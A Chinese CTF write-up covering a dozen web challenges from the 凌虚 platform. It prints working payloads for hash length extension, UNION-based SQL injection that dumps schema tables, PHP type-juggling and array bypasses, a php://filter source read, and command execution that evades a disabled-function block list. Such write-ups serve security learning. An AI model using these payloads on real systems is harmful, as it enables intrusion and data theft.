---
title: 凌虚攻防平台web
categories: 
---
## 需要学习 : HASH 长度扩展攻击,SQL二次注入 , SSTI ,  反序列化
<!--more-->
## web1-hash attack
- 知识点  hash长度扩展攻击

```bash
<?php 
echo "已知一组role为admin，salt长度为4，hash为c7813629f22b6a7d28a08041db3e80a9,想要扩展的字符串是joychou"."<br>"; 
$flag = "**********"; 
$role = $_REQUEST["role"]; 
$hash = $_REQUEST["hash"]; 
$salt = "***********"; //The length is 4 

if ($hash !== md5($salt.$role)){ 
    echo 'wrong!';      
    exit; 
} 

if ( $role == 'admin'){ 
    echo 'no no no !, hash cann\'t be admin'; 
    exit; 
} 

//echo "You are ".$role.'</br>'; 
echo 'Congradulation! The flag is'.$flag; 

?> wrong

```

payload:

使用    [链接](https://github.com/JoyChou93/md5-extension-attack)

```bash
python md5pad.py c7813629f22b6a7d28a08041db3e80a9 joychou 9
```

```bash
POST:
role=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00H%00%00%00%00%00%00%00joychou&hash=06cf5a94dcda53659f58c0f411ba0bd8
```

![](https://img-blog.csdnimg.cn/20210220225428655.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)


---
## web2-后台管理系统
- 知识点  sql约束攻击

 `SQL约束攻击`：在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。

换句话说“vampire”等同于“vampire ”，对于绝大多数情况来说都是成立的（诸如WHERE子句中的字符串或INSERT语句中的字符串）

例如以下语句的查询结果，与使用用户名“vampire”进行查询时的结果是一样的。
```
  SELECT * FROM users WHERE username=‘vampire     ‘;
```
  
   但也存在异常情况，最好的例子就是LIKE子句了。注意，对尾部空白符的这种修剪操作，主要是在“字符串比较”期间进行的。这是因为，SQL会在内部使用空格来填充字符串，以便在比较之前使其它们的长度保持一致。

   在所有的INSERT查询中，`SQL都会根据varchar(n)来限制字符串的最大长度`。也就是说，如果字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“vampire”时，实际上只能插入字符串的前5个字符，即“vampi”。

解：

注册  `'admin     '`

![](https://img-blog.csdnimg.cn/20210220225836255.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
登录  `'admin     '`

![](https://img-blog.csdnimg.cn/20210220225924345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
## web3-成绩查询
- 知识点  sql注入

![](https://img-blog.csdnimg.cn/20210220230026800.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
Bp抓包

回显字段数为4

![](https://img-blog.csdnimg.cn/20210220230046393.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

```
 查库 : 0'union select 1,2,3,database()#
 查表 : 0'union select 1,2,3,table_name from information_schema.tables where table_schema=database()#
 查列 : 0'union select 1,2,3,column_name from information_schema.columns where table_name='fl4g'#
 查数据 : 0'union select 1,2,3,flag from fl4g#
```


---
## web4-warmup
- 知识点  代码审计

同 攻防世界warmup

---
## web5-这里有几首歌
- 知识点 代码审计

![](https://img-blog.csdnimg.cn/20210220230837560.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
查看源码发现download.php 且歌曲为base64编码

![](https://img-blog.csdnimg.cn/20210220230854730.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
访问download.php 被禁止

利用下载功能 将download.php 编码

构造payload：
```
  download.php?url=ZG93bmxvYWQucGhw
```

成功下载download.php的源码

![](https://img-blog.csdnimg.cn/20210220231052101.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

发现hereiskey.php   编码

payload：
```
  download.php?url= aGVyZWlza2V5LnBocA==
```
芜湖~

![](https://img-blog.csdnimg.cn/20210220231213905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)


---
## web6(x)

```
SQL二次注入
```

---
## web7-shop
- 知识点  条件竞争

![](https://img-blog.csdnimg.cn/20210220231401379.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
Bp 抓包 不断发送

![](https://img-blog.csdnimg.cn/20210220231418128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
## web8(x)
```
SSTI
```

---
## web9
- 知识点 代码审计

![](https://img-blog.csdnimg.cn/20210220231706812.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

Dirsearch

![](https://img-blog.csdnimg.cn/20210220231732122.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
发现index.php~
查看源码 发现flag  提交flag不对

```bash
<?php
error_reporting(0);
$flag = 'SSCTF{13b5bfe96f3e2de411c9f76f4a582adf}';
if  ("POST" == $_SERVER['REQUEST_METHOD']) 
{ 
    $username = $_POST['username'];
    $password = $_POST['password']; 
    if($username == 1024){
        if(intval($username)<1024){
            if (0 >= preg_match('/^[[:graph:]]{12,}$/', $password))
                { 
                    echo '<script>alert("Password Wrong Format");</script>';
                    exit; 
                } 
                while (TRUE) 
                { 
                    $reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'; 
                    if (6 > preg_match_all($reg, $password, $arr)) 
                        break; 
                    $c = 0; 
                    $ps = array('punct', 'digit', 'upper', 'lower'); 
                    foreach ($ps as $pt) 
                    { 
                        if (preg_match("/[[:$pt:]]+/", $password)) 
                            $c += 1; 
                    } 
                    if ($c < 3) break;
                    if ("2048" == $password) echo '<script>alert("'.$flag.'");</script>'; 
                    else echo '<script>alert("Wrong Password");</script>'; 
                    exit; 
                } 
        }
        else{
            echo '<script>alert("Wrong Username");</script>';
        }
    }
    else{
        echo '<script>alert("Username Wrong Format");</script>';
    } 
}
?>

```

```
求username==1024且intval($username)<1024，此可使用四舍五入绕过

要求0 >= preg_match('/^[[:graph:]]{12,}$/', $password)，必须是12个字符以上

$reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/';
if(6 > preg_match_all($reg,$password,$arr));
要求匹配到的次数要大于6次

if ("2048" == $password) echo '<script>alert("'.$flag.'");</script>'; 
要求password为2048
可用科学计数法数字验证绕过
```

payload:
```
  username=1023.99999999999999999&password=20480.00000000e-1  
```

---
## web10
- 知识点 时间戳

![](https://img-blog.csdnimg.cn/20210220232147697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

源码：

![](https://img-blog.csdnimg.cn/20210220232228132.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
访问checklogin.php

![](https://img-blog.csdnimg.cn/20210220232246512.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/20210220232254256.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
源码：
![](https://img-blog.csdnimg.cn/20210220232307395.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
访问 txt

```bash
session_start();
$_SESSION['pwd']=time();
foreach(array_keys($_REQUEST) as $v){
        $key = $v;
        $$key = $_REQUEST[$v];
    }
if (isset ($_POST['password'])) {
    if ($_SESSION['pwd'] == $pwd)
        die('Flag:'.$flag);
    else{
        print '<p>猜测错误.</p>';
        $_SESSION['pwd']=time().time();
    }
}

```

注：
```
  time()函数生成当前时间的时间戳
 
  $_SESSION['pwd']为当前时间的时间戳，当$pwd等于$_SESSION['pwd']时，输出flag
 
  pwd赋值为1分钟之后时间戳，然后不断的post，当 $_SESSION['pwd'] == $pwd为真时，即可得到flag
```

设置时间戳

![](https://img-blog.csdnimg.cn/20210220232539931.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
提前不断post

![](https://img-blog.csdnimg.cn/20210220232552150.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
## web11-前女友
- 知识点 代码审计

![](https://img-blog.csdnimg.cn/20210220232700615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
页面隐藏一个链接 点进去

```bash
<?php
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];
    $v3 = $_GET['v3'];
    if($v1 != $v2 && md5($v1) == md5($v2)){
        if(!strcmp($v3, $flag)){
            echo $flag;
        }
    }
}
?>
```
`issert函数`和`md5函数`都`不能处理数组`，返回值为null

第二个是strcmp函数，需要v3和flag的值相同才返回flag的值，我们依旧使用函数特性，strcmp函数如果出错，那么它的返回值也会是0，和字符串相等时返回值一致。
那么如何出错呢，猜测不可比较时出错，那么传入一个数组试试，所以最后构造参数并用get方法传入

payload：
```
  ?v1[]=1&v2[]=2&v3[]=3
```

---
## web12-排好队绕过去
- 知识点 Md5绕过

题目：
md5(uname)===md5(passwd)

=== 比较值和类型
传入数组则值为空，且数组类型相同
payload:
```
  uname[]=1&passwd[]=2
```

---
## web13 phpweb(x)
- 知识点 反序列化

![](https://img-blog.csdnimg.cn/20210220233815415.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
抓包：

![](https://img-blog.csdnimg.cn/20210220233832573.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
在 Bp中看到 func 和p判断为可以 人为指定 函数名和参数

构造 payload 得到 index.php 页面源码
```
 func=file_get_contents&p=php://filter/read=convert.base64-encode/resource=index.php
```

![](https://img-blog.csdnimg.cn/20210220233903176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
解码:

```bash
<!DOCTYPE html>
<html>
<head>
    <title>phpweb</title>
    <style type="text/css">
		body {
			background: url("bg.jpg") no-repeat;
			background-size: 100%;
		}
        p {
            color: white;
        }
	</style>
</head>

<body>
    <script language=javascript>
        setTimeout("document.form1.submit()",5000)
    </script>
    <p>
<?php
$disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
function gettime($func, $p) {
    $result = call_user_func($func, $p);
    $a= gettype($result);
    if ($a == "string") {
        return $result;
    } else {return "";}
}
class Test {
    var $p = "Y-m-d h:i:s a";
    var $func = "date";
    function __destruct() {
        if ($this->func != "") {
            echo gettime($this->func, $this->p);
        }
    }
}
$func = $_REQUEST["func"];
$p = $_REQUEST["p"];

if ($func != null) {
    $func = strtolower($func);
    if (!in_array($func,$disable_fun)) {
        echo gettime($func, $p);
    }else {
        die("Hacker...");
    }
}
?>
    </p>
    <form  id=form1 name=form1 action="index.php" method=post>
    <input type=hidden id=func name=func value='date'>
    <input type=hidden id=p name=p value='Y-m-d h:i:s a'>
</body>
</html>

```
可以看到几乎过滤所有命令执行的函数，但是可以利用Test类的析构函数调用。调用链为：
```
 反序列化->析构函数->gettime()->回调函数
```

payload：
```
func=\exec&p=ls func=\exec&p=cat $(find / -name flag*)
```
![](https://img-blog.csdnimg.cn/20210220234059774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

